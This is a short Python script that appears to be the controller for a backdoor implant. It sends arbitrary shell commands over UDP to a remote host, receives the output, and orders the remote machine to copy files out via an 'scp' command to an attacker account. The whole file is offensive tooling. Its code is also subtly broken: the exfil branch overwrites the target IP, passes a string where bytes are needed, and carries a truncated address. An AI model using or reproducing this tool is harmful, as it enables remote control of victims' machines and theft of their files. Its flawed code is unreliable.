#!/usr/bin/python
import sys, socket

commands = ['execute', 'exfil']

if len(sys.argv) <2:
	print("USAGE: " + sys.argv[0] + " [IP]  " + str(commands))
	sys.exit()

ip = sys.argv[1]

def execute(command):
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.sendto(bytes(command, 'utf-8'), (ip, 5151))
		respSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		respSock.bind(('0.0.0.0', 6060))
		response = respSock.recvfrom(4096)
		print(response[0].decode('utf-8'))
	
	except socket.gaierror:
		print("OWO (notices lack of internet connection)")

def exfiltrate(filepath):
	command = ('scp ' + filepath + " snag@192.168.:~/milo")
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.sendto((command), (ip, 5050))

if sys.argv[2] in commands:
	instruction = sys.argv[2]
	if instruction == 'execute':
		shellCom = sys.argv[3]
		for x in range(4, len(sys.argv)):
			shellCom = shellCom + " " + sys.argv[x]
		execute(shellCom)
	if instruction == 'exfil':
		ip = sys.argv[2]
		filepath = sys.argv[3]
		exfiltrate(filepath)

else:
	print("USAGE: " + sys.argv[0] + " [IP] " + str(commands))
	sys.exit()
